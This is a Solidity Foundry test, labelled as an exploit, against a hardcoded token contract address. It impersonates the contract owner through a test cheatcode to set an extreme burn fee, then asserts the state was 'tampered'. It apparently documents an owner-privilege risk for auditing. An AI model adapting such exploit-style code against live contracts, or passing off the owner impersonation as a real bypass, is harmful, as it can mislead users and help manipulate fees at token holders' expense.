// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Ilpp {
    function owner() external view returns (address);
    function _burnFee() external view returns (uint256);
    function changeBurnFee(uint256 _newburnFee, uint256 _newburnDivisor) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112;
    address attacker = address(this);
    Ilpp public target;
    address public owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = Ilpp(TARGET);
        owner = target.owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);
        target.changeBurnFee(30000, 1000);
        vm.stopPrank();
        assertEq(target._burnFee(), 30000, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
